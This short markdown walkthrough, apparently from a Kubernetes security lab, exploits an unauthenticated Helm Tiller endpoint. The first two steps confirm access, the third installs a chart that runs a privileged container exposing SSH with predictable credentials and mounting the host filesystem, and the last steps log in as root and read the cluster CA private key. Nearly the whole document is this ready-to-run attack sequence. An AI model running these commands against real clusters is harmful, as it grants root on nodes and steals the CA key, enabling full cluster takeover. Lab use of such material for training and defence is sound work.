# Unauthenticated Tiller

1. `helm --host [CLUSTERIP]:[NodePort] version` - Will prove we have access when the server replies.
2. `helm --host [CLUSTERIP]:[NodePort] ls` - will show there are no charts currently deployed.
3. `helm --host [CLUSTERIP]:[NodePort] install /charts/privsshchart-0.1.0.tgz` - Will deploy a chart which runs a privileged container in the cluster and opens SSH with a predictable username/password.  This should deploy the SSH service to 31337/TCP.  This pod also mounts the underlying root filesystem under `/host` on the cluster.
4. `ssh -p 31337 root@[CLUSTERIP]`
5. `cat /host/etc/kubernetes/pki/ca.key`
6. Profit!